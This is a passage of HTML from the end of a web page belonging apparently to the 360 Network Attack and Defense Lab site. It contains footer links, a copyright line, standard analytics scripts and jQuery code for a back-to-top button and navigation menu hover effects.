            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
